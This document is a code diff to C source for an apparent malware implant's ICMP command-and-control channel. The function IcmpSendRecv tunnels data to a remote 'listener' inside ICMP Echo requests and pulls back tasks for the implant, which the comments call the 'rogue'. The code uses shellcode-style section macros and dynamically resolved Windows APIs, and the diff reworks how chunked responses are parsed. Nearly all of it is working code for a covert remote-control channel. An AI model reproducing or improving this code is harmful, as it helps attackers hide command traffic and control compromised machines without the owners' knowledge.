@@ -77,10 +77,10 @@ typedef struct
  *
  * Purpose:
  *
- * Sends a buffer over ICMP back to the listener.
- * Uses ICMP Echo requests to safely operate 
- * without issue. Data is returned if it matches
- * the specification.
+ * Sends a ICMP Echo request to a listener, and
+ * returns a task if one is available. Chunked
+ * requests will result in rogue sleeping for
+ * periods at a time.
  *
 !*/
 D_SEC( B ) BOOL IcmpSendRecv( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 InLength, _Out_ PVOID* OuBuffer, _Out_ PUINT32 OuLength, _Out_ PBOOL OuSuccess )
@@ -228,23 +228,27 @@ D_SEC( B ) BOOL IcmpSendRecv( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UIN
 													};
 													/* Final packet. Check if we have return data */
 													if ( ( Idx + 1 ) == Seq.ChunkTotal && Seq.Id != Sqp->Id ) {
-														/*  Read the response!: Note, chunk if needed, go to next field */
-														if ( ( *OuBuffer = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) ) ) ) {
+														if ( Sqp->ChunkTotal >= 1 ) {
+															/*  Read the response!: Note, chunk if needed, go to next field */
+															if ( ( *OuBuffer = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) ) ) ) {
+					
+																/* Set response chunk(s) */
+																Max = Sqp->ChunkTotal;
+	
+																/* Set response UID */
+																Uid = Sqp->Id;
 
-															/* Set response chunk(s) */
-															Max = Sqp->ChunkTotal;
+																/* Copy over buffer */
+																__builtin_memcpy( *OuBuffer, Sqp->Buffer, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) );
 
-															/* Set response UID */
-															Uid = Sqp->Id;
-
-															/* Copy over buffer */
-															__builtin_memcpy( *OuBuffer, Sqp->Buffer, Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT ) );
-
-															/* Set length */
-															*OuLength = Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT );
+																/* Set length */
+																*OuLength = Rep->DataSize - sizeof( HDR_PKT ) - sizeof( SEQ_PKT );
+															};
+															/* Status */
+															Ret = TRUE; 
+														} else {
+															break;
 														};
-														/* Status */
-														Ret = TRUE; 
 													} 
 													else {
 														break;
@@ -428,9 +432,7 @@ D_SEC( B ) BOOL IcmpSendRecv( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UIN
 							Api.IcmpCloseHandle( Icf ); 
 							Icf = INVALID_HANDLE_VALUE;
 						};
-					};
-					/* Only one chunk was sent */
-					if ( Max == 1 ) {
+					} else {
 						/* Status */
 						*OuSuccess = TRUE;
 					};
